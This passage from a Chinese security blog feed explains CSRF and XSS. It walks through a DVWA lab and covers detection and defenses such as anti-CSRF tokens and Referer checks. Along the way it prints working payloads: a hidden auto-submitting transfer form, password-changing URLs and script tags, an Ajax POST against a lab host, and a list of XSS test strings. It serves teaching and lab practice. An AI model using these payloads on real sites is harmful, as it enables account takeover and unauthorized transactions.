src=&quot;http://www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000&quot;&gt;</code></p><p>　　当你登录网站A后，没有及时登出，这时你访问了论坛B，不幸的事情发生了，你会发现你的账号里面少了10000块。</p><p>　　为什么会这样呢，在你登录银行A时，你的浏览器端会生成银行A的cookie，而当你访问论坛B的时候，页面上的<code>&lt;img&gt;</code>标签需要浏览器发起一个新的HTTP请求，以获得图片资源，当浏览器发起请求时，请求的却是银行A的转账地址<code>www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000</code>，并且会带上银行A的cookie信息，结果银行的服务器收到这个请求后，会以为是你发起的一次转账操作，因此你的账号里边便少了10000块。</p><p>　　当然，绝大多数网站都不会使用GET请求来进行数据更新，因此，攻击者也需要改变思路，与时俱进。</p><p>　　假设银行将其转账方式改成POST提交，而论坛B恰好又存在一个XSS漏洞，恶意用户在它的页面上植入如下代码：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">"aaa"</span> action=<span class="string">"http://www.xxx.com/transfer.do"</span> metdod=<span class="string">"<span class="keyword">POST</span>"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"accountNum"</span> value=<span class="string">"10001"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var form = document.forms('aaa');</span><br><span class="line">    form.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>　　如果你此时恰好登录了银行A，且没有登出，当你打开上述页面后，脚本会将表单aaa提交，把accountNum和money参数传递给银行的转账地址<code>http://www.xxx.com/transfer.do</code>，同样的，银行以为是你发起的一次转账会从你的账户中扣除10000块。</p><p>　　当然，以上只是举例，正常来说银行的交易付款会有USB key、验证码、登录密码和支付密码等一系列屏障，流程比上述流程复杂得多，因此安全系数也高得多。</p><h3 id="DVWA下的CSRF攻击实验"><a href="#DVWA下的CSRF攻击实验" class="headerlink" title="DVWA下的CSRF攻击实验"></a>DVWA下的CSRF攻击实验</h3><h4 id="CSRF漏洞🔺Get方式利用"><a href="#CSRF漏洞🔺Get方式利用" class="headerlink" title="CSRF漏洞🔺Get方式利用"></a>CSRF漏洞🔺Get方式利用</h4><p><img src="/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8.png" alt></p><p>漏洞确认：</p><p>1、修改密码，没有对原密码进行验证，直接修改了， 判断缺少验证机制，可能存在CSRF</p><p><img src="/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A4.png" alt></p><p>2、确认referer无限制，无token</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">123.129</span><span class="regexp">/dvwa/</span>vulnerabilities<span class="regexp">/csrf/</span>?password_new=password&amp;password_conf=password&amp;Change=Change<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A42.png" alt></p><p>漏洞利用：</p><p>1、直接发送链接</p><p>2、诱骗用户点击</p><p>3、会弹出提示</p><p>缺点：该利用方法，容易被用户发现。</p><p>改进思路：</p><p>　　结合XSS，形成XSRF。用户触发XSS漏洞（存储型最佳），然后XSS漏洞执行script<code>&lt;script src=&quot;修改密码的链接&quot;&gt;&lt;/script&gt;</code>。前提是需要在用户访问概率高的网站上挖到XSS漏洞，或者欺骗用户访问钓鱼站点。</p><p>改进流程：</p><p>１、保持dvwa中csrf页面的登录（尾数129）<br>２、部署一个csrf站点（尾数130），利用XSS(Stored);<br>３、在130增加一个XSS埋伏</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>４、重新用步骤3的密码123登录，观察效果。</p><h4 id="CSRF漏洞🔺Post方式利用"><a href="#CSRF漏洞🔺Post方式利用" class="headerlink" title="CSRF漏洞🔺Post方式利用"></a>CSRF漏洞🔺Post方式利用</h4><h5 id="使用CSRFTester思路"><a href="#使用CSRFTester思路" class="headerlink" title="使用CSRFTester思路"></a>使用CSRFTester思路</h5><p>环境准备：</p><p>修改DVWA下CSRF漏洞的源码为POST方式提交</p><p>找到<code>/csrf的index.php</code>，将<code>get</code>提交方式修改为<code>post</code></p><p>找到<code>/csrf的low.php</code>，将<code>$＿GET</code>修改为<code>$＿REQUEST</code>(说明:这个表示可以用get也可以用POST)</p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F.png" alt></p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F2.png" alt></p><p>测试是否成功修改POST提交方式</p><p>POST方式提交，提交后URL不会出现具体的参数及参数值</p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F%E9%AA%8C%E8%AF%81.png" alt></p><p>抓取POST提交方式的数据包</p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85%E7%BB%93%E6%9E%9C.png" alt></p><p>通过OWASP CSRFTester抓包</p><p><img src="/posts/21bbd6b8.html/CSRFTester.png" alt></p><p>OWASP CSRFTester构建表单</p><p>Forms，创建一个form表单。内容为hidden，用户不可见（可get、post）</p><p>iFrame：创建一个iframe框架，高宽为0，用户不可见（可get、post ）</p><p>IMG：创建一个IMG标签（只能get）</p><p>XHR：创建一个AJAX请求（可get、post ）</p><p>Link：创建一个a标签的超链接（只能get）</p><p>修改上一步生产的index.html</p><p><img src="/posts/21bbd6b8.html/CSRFTester%E5%88%9B%E5%BB%BA%E7%9A%84%E8%A1%A8%E5%8D%95.png" alt></p><p>将文档放置在csrf站点，<code>http://192.168.123.130/csrf/index.html</code></p><p><img src="/posts/21bbd6b8.html/CSRFTester%E6%94%BE%E7%BD%AE%E7%AB%99%E7%82%B9.png" alt></p><p>测试</p><p>1、保持dvwa在csrf的模块</p><p>2、在同一个浏览器输入url，<code>http://192.168.123.130/csrf/index.html</code>，然后退出dvwa页面登录，测试密码是否为444，但是没有办法静默执行，因为会有提示</p><h5 id="使用Ajax思路"><a href="#使用Ajax思路" class="headerlink" title="使用Ajax思路"></a>使用Ajax思路</h5><p>通过Ajax，xmlrequest往表单里面提交数据</p><p>环境准备：</p><p>1、在dvwa上，同时存在csrf和xss</p><p>2、在csrf站点上，制造ajax.html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">xmlhttp.open(“POST”,http:<span class="comment">//192.168.123.129/dvwa/vulnerabilities/csrf/”,true);</span></span></span><br><span class="line">xmlhttp.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);</span><br><span class="line">xmlhttp.send(“password_new=123456&amp;password_conf=123456”&amp;Change=Change”);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/21bbd6b8.html/ajax.png" alt></p><p><code>http://192.168.123.130/csrf/ajax.html</code></p><p>3、在dvwa下，利用反射型XSS更改密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.123.130/csrf/ajax.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/21bbd6b8.html/%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81.png" alt></p><p>此时密码已经修改</p><p>4、用admin和password登录成功</p><p><img src="/posts/21bbd6b8.html/%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F.png" alt></p><p>　　如果在目标站点本身上存在XSS，则可以这样利用，使用<code>&lt;script&gt;，&lt;img&gt;</code>标签。但目标站点如果存在XSS，则直接利用XSS比利用CSRF更便捷。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>　　<code>GET方式</code>，在用户活动状态下点击即可完成操作</p><p>　　<code>POST方式</code>，<code>参数不能通过URL提交，需要构建表单</code>，欺骗用户访问。该情况仍然结合XSS的比较多，或者直接诱骗用户访问攻击者自己搭建的钓鱼站点。</p><h3 id="CSRF漏洞检测😄"><a href="#CSRF漏洞检测😄" class="headerlink" title="CSRF漏洞检测😄"></a>CSRF漏洞检测😄</h3><p>　　如何确认一个web系统存在CSRF漏洞呢，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><h4 id="👉步骤1"><a href="#👉步骤1" class="headerlink" title="👉步骤1"></a>👉步骤1</h4><p>　　对目标站点进行踩点，对增删改的地方进行标记，并观察其逻辑</p><ul><li><p>比如修改管理员账户时，不需要提供验证旧密码</p></li><li><p>比如提交留言的动作，关注XX微博的动作等等</p></li></ul><h4 id="👉步骤2"><a href="#👉步骤2" class="headerlink" title="👉步骤2"></a>👉步骤2</h4><p>　　提交操作（get/post），观察http头部 的referer，并验证后台是否有referer限制</p><ul><li>比如使用抓包工具抓包，然后修改/删除referer后，重放， 看是否可以正常提交。</li></ul><h4 id="👉步骤3"><a href="#👉步骤3" class="headerlink" title="👉步骤3"></a>👉步骤3</h4><p>　　确认cookie的有效性（欺骗，或目标网 站存在漏洞）</p><ul><li>虽然退出或关闭了浏览器，但session并没有过期。</li></ul><p>　　随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder。</p><p>以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：</p><p>　　使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p><h3 id="CSRF攻击的防御👍"><a href="#CSRF攻击的防御👍" class="headerlink" title="CSRF攻击的防御👍"></a>CSRF攻击的防御👍</h3><p>　　目前防御CSRF攻击主要有三种策略：<code>验证HTTP Referer字段</code>；<code>在请求地址中添加token并验证</code>；<code>在HTTP头中自定义属性并验证</code>。</p><h4 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h4><p>　　根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。</p><p>　　这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p><p>　　然而，这种方法并非万无一失。Referer的值可以抓包伪造修改，使得黑客完全可以把用户浏览器的Referer值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行CSRF攻击。</p><p>　　即便黑客无法篡改Referer值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有Referer值而认为是CSRF攻击，拒绝合法用户的访问。</p><h4 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h4><p>　　现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。</p><p>　　CSRF攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的cookie 来通过安全验证。</p><p>　　要抵御CSRF，关键在于<code>在请求中放入黑客所不能伪造的信息</code>，并且<code>该信息不存在于cookie之中</code>。</p><p>　　可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><p>比如：</p><p>1、用户访问某个表单页面。</p><p>2、 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p><p>3、在页面表单附带上Token参数。</p><p>4、用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</p><p>　　这种方法要比检查Referer要安全一些，token可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对。token的值必须是随机的，不可预测的。有了token的存在，攻击者无法再构造一个带有合法token的请求实施CSRF攻击。另外使用token时应注意token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免token泄露。<code>但这种方法的难点在于如何把token以参数的形式加入请求</code>。</p><p>　　对于GET请求，token将附在请求地址之后，这样URL就变成 <code>http://url?csrftoken=tokenvalue</code>。 而对于POST请求来说，要在form的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把token以参数的形式加入请求了。</p><p>　　但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上token是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用javascript遍历整个dom树，对于dom中所有的a和form标签后加入token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的html代码，这种方法就没有作用，还需要程序员在编码时手动添加token。</p><p>　　该方法还有一个缺点是难以保证token本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，黑客可以在自己的网站上得到这个token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加token的时候增加一个判断，如果这个链接是指向自己网站的，就在后面添加token，如果是通向其他的则不加。不过，即使这个csrftoken不以参数的形式附加在请求之中，黑客的网站也同样可以通过Referer来得到这个token值以发动CSRF攻击。这也是一些用户喜欢手动关闭浏览器Referer功能的原因。</p><h4 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h4><p>　　这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不便，同时，通过XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。</p><p>　　然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于Ajax方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行CSRF防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为XMLHttpRequest请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><p>除了以上的三种主要防御CSRF攻击的策略之外，还有以下几种防御措施👇</p><h4 id="尽量使用POST，限制GET"><a href="#尽量使用POST，限制GET" class="headerlink" title="尽量使用POST，限制GET"></a>尽量使用POST，限制GET</h4><p>　　GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。</p><p>　　接口最好限制为POST使用，GET则无效，降低攻击风险。</p><p>　　当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p><h4 id="浏览器Cookie策略"><a href="#浏览器Cookie策略" class="headerlink" title="浏览器Cookie策略"></a>浏览器Cookie策略</h4><p>　　IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。</p><p>　　但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。</p><p>Cookie分为两种：</p><ul><li><p>Session Cookie（在浏览器关闭后，就会失效，保存到内存里）</p></li><li><p>Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）</p></li></ul><p>　　另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。</p><h4 id="加验证码"><a href="#加验证码" class="headerlink" title="加验证码"></a>加验证码</h4><p>　　验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。</p><p>　　但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。</p><h3 id="CSRF与XSS的区别✌"><a href="#CSRF与XSS的区别✌" class="headerlink" title="CSRF与XSS的区别✌"></a>CSRF与XSS的区别✌</h3><p>1、XSS是盗取用户cookie，从而进一步攻击，CSRF直接完成对受信任网站的攻击；</p><p>　　XSS攻击条件比CSRF要简单，完成CSRF攻击要诸多条件；</p><p>3、XSS是实现CSRF诸多条件的一种，这样的结合称为XSRF；</p><p>4、XSS攻击很多时候是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作（直接完成攻击目标），需要构造出目标网站的URL结构。</p><p>　　<strong>XSS是攻击者偷了你车的钥匙后，用你的钥匙进入到你车，开你的车。</strong></p><p>　　<strong>CSRF是让你自己用钥匙开门后，帮助攻击者开了你的车，并且你没有意识到这个操作。</strong></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://server.zzidc.com/fwqcjwt/web/2295.html" target="_blank" rel="noopener">带你快速了解CSRF攻击与防御</a></li><li><a href="https://www.jianshu.com/p/67408d73c66d" target="_blank" rel="noopener">安全|常见的Web攻击手段之CSRF攻击</a></li><li><a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369" target="_blank" rel="noopener">CSRF攻击与防御</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;长风破浪会有时，直挂云帆济沧海&lt;/blockquote&gt;&lt;p&gt;　　CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSRF" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/CSRF/"/>
    
      <category term="跨站域请求伪造攻击" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E8%B7%A8%E7%AB%99%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>XSS的攻击原理与防御原理</title>
    <link href="https://xiaoxiaoxiaoxiaolin.github.io/posts/9ee0c5.html/"/>
    <id>https://xiaoxiaoxiaoxiaolin.github.io/posts/9ee0c5.html/</id>
    <published>2019-08-21T01:38:18.000Z</published>
    <updated>2019-08-22T01:02:10.050Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">迟日江山丽，春风花草香</blockquote><p>　　xss又称跨站脚本攻击，原称为css（Cross-Site Scripting），因为和层叠样式表(Cascading Style Sheets)重名，所以又称为xss(x一般有未知的含义，还有扩展的含义)。</p><a id="more"></a><h3 id="XSS的攻击原理"><a href="#XSS的攻击原理" class="headerlink" title="XSS的攻击原理"></a>XSS的攻击原理</h3><p>　　xss攻击涉及到了攻击者，用户和web server。主要是利用了网站本身设计的不严谨性，攻击者通过对网页插入恶意的攻击脚本，导致当用户在浏览网页的时候，嵌入其中的攻击脚本就会被执行，从而达到恶意攻击用户的特殊目的。攻击者通过xss攻击，可以获取到用户的cookie，然后发送给攻击者想要攻击的网站，因为跨站了，所以也称为跨站脚本攻击。</p><h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p>　　根据攻击的来源，xss攻击的分类主要分为：反射型xss、存储型xss和DOM型xss三种。</p><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>　　反射型xss，也叫“非持久型xss”。用户点击攻击链接，触发了恶意脚本，服务器解析后响应，在返回的响应内容中出现攻击者的xss代码，被浏览器执行。一来一去，xss攻击脚本被web server反射回来给浏览器执行，所以称为反射型xss。</p><p>反射型xss的攻击步骤：</p><p>　　1、攻击者构造出特殊的URL，其中包含恶意代码；</p><p>　　2、用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回给浏览器；</p><p>　　3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；</p><p>　　4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>特点：</p><p>　　1、攻击脚本非持久性，没有保存在web server中，而是直接出现在了URL地址中；</p><p>　　2、反射型xss漏洞常见于通过URL传递参数的功能，如网站搜索、跳转等；</p><p>　　3、由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。一般通过邮件、社交软件等方式直接发送攻击URL，通过用户的点击来达到攻击目的的。</p><p>　　POST的内容也可以触发反射型xss，只不过其触发条件比较苛刻，需要构造表单提交页面，并引导用户点击，所以非常少见。</p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>　　存储型xss，也叫“持久型xss”，相比反射型xss，存储型xss是把恶意脚本保存到了web server中的，这种攻击具有较强的稳定性和持久性，危害性也更大。这样每一个访问特定网页的用户，都会受到攻击。</p><p>存储型xss的攻击步骤：</p><p>　　1、攻击者将恶意代码提交到目标网站的数据库中；</p><p>　　2、用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器；</p><p>　　3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；</p><p>　　4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>特点：</p><p>　　1、攻击脚本持久性，保存在web server中；</p><p>　　2、这种攻击常见于带有用户保存数据的网站功能，一般通过论坛发帖、商品评论、用户私信等功能（所有能够向web server输入内容的地方），将攻击脚本存储到web server中。</p><p>　　有时候反射型xss和存储型xss是同时使用的，比如：先通过对一个攻击url进行编码（来绕过xss filter），提交到web server（存储在web server中），然后用户在浏览页面时，如果点击该url，就会触发一个xss攻击。当然用户点击该url时，也可能会触发一个CSRF（Cross site request forgery）攻击。</p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>　　DOM（Document Object Model） –based 漏洞是基于文档对象模型的一种漏洞，通过修改页面的DOM节点而形成的xss漏洞。</p><p>DOM型xss的攻击步骤：</p><p>　　1、攻击者构造出特殊的URL，其中包含恶意代码。</p><p>　　2、用户打开带有恶意代码的URL。</p><p>　　3、用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。</p><p>　　4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>　　DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><p>特点：</p><p>　　1、攻击脚本不与服务端交互的，只与客户端上的js交互，攻击脚本放到了js中执行，然后显示出来；</p><p>　　2、DOM型xss也是一种反射型xss。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>　　反射型xss跟存储型xss的区别是：<code>存储型xss非持久性，攻击脚本存在服务器里</code>，<code>反射型xss持久性，攻击脚本存在URL里</code>。</p><p>　　DOM型xss跟前两种xss的区别：DOM型xss，是通过修改页面的DOM节点来形成xss的，取出和执行恶意代码由浏览器端完成，属于<code>前端JavaScript自身的安全漏洞</code>，而其他两种xss都属于<code>服务端的安全漏洞</code>。</p><table><thead><tr><th align="left">类型</th><th>存储区</th><th>插入点</th></tr></thead><tbody><tr><td align="left">存储型 XSS</td><td>后端数据库</td><td>HTML</td></tr><tr><td align="left">反射型 XSS</td><td>URL</td><td>HTML</td></tr><tr><td align="left">DOM型 XSS</td><td>后端数据库/前端存储/URL</td><td>前端 JavaScript</td></tr></tbody></table><h3 id="XSS漏洞的检测"><a href="#XSS漏洞的检测" class="headerlink" title="XSS漏洞的检测"></a>XSS漏洞的检测</h3><h4 id="xss探针"><a href="#xss探针" class="headerlink" title="xss探针"></a>xss探针</h4><p>　　xss探针可检测出网站有没有对xss漏洞做最基础的防御。</p><p>　　在测试xss的位置写入代码，查看页面源码，看看哪些代码被过滤或者转义了。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'';!--<span class="string">"&lt;XSS&gt;=&amp;&#123;()&#125;</span></span><br></pre></td></tr></table></figure><h4 id="xss语句"><a href="#xss语句" class="headerlink" title="xss语句"></a>xss语句</h4><p>　　除了xss探针以外，还可以输入最简单的测试语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>　　如果插入的语句原封不动的呈现在了浏览器中，那么说明：</p><ul><li>代码没有被过滤，存在xss；</li><li>代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。</li></ul><h4 id="常用的xss检测语句"><a href="#常用的xss检测语句" class="headerlink" title="常用的xss检测语句"></a>常用的xss检测语句</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)<span class="comment">//</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//用分号，也可以分号+空格（回车一起使用）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span>=<span class="string">1</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>nmask<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span 